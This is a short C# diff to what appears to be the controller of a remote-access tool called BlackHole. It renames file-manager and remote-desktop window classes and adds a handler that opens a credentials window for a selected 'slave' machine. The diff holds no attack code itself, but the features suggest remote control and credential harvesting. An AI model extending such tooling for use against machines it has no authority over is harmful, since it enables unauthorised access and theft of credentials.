@@ -166,7 +166,7 @@ namespace BlackHole.Master
         /// <param name="sender"></param>
         /// <param name="e"></param>
         private void OpenFileManager(object sender, RoutedEventArgs e) =>
-            OpenSlaveWindowIfSelected(slave => new FileManager(slave));
+            OpenSlaveWindowIfSelected(slave => new FileManagerWindow(slave));
 
         /// <summary>
         /// 
@@ -174,7 +174,7 @@ namespace BlackHole.Master
         /// <param name="sender"></param>
         /// <param name="e"></param>
         private void OpenRemoteDesktop(object sender, RoutedEventArgs e) =>
-            OpenSlaveWindowIfSelected(slave => new RemoteDesktop(slave));
+            OpenSlaveWindowIfSelected(slave => new RemoteDesktopWindow(slave));
 
         /// <summary>
         /// 
@@ -247,5 +247,8 @@ namespace BlackHole.Master
             // finally, open up the window
             window.Show();
         }
+
+        private void OpenCredentialsWindow(object sender, RoutedEventArgs e) =>
+            OpenSlaveWindowIfSelected(slave => new CredentialsWindow(slave));
     }
 }
